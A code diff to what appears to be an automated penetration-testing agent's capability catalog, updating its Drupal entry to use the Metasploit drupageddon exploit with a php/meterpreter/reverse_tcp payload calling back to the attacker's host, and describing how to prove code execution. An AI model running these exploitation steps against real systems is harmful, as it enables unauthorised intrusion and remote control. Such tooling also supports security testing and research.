@@ -37,20 +37,22 @@ CAPABILITY_CATALOG: list[ServiceCapability] = [
     ),
     ServiceCapability(
         service_pattern="Drupal",
-        msf_module="exploit/unix/webapp/drupal_drupalgeddon2",
+        msf_module="exploit/multi/http/drupal_drupageddon",
         preconditions=(
             "Fingerprint Drupal yourself from recon (CHANGELOG.txt, a sites/default "
             "tree, /user/login, or a Drupal-looking listing) and READ its version "
-            "off the box, AND confirm it is a vulnerable Drupal 7.x (before 7.58). "
-            "Never assume the version."
+            "off the box, AND confirm it is a vulnerable Drupal 7.x (7.0-7.31, fixed "
+            "in 7.32). Never assume the version."
         ),
         tradecraft_notes=(
             "Drive msfconsole non-interactively via run_on_attacker with RHOSTS, "
-            "RPORT 80 (unless recon found another port), TARGETURI set to the path "
-            "your own listing showed Drupal served from (never a hardcoded guess), "
-            "PAYLOAD cmd/unix/generic, and CMD id. The payload auto-enables "
-            "DUMP_OUTPUT, so genuine `uid=...` output in the dumped HTTP body is the "
-            "RCE proof. msf's success banner or session line is not."
+            "TARGETURI set to the path your own listing showed Drupal served from "
+            "(never a hardcoded guess), PAYLOAD php/meterpreter/reverse_tcp, and "
+            "LHOST set to your own attacker-box IP (determine it yourself in the "
+            "same command, e.g. `hostname -I`). `run -z` backgrounds the session "
+            "the instant it opens; `sessions -i 1 -c id` in the same command then "
+            "runs a real command and returns its output directly. That returned "
+            "`uid=...` output is the RCE proof — a session merely opening is not."
         ),
     ),
 ]
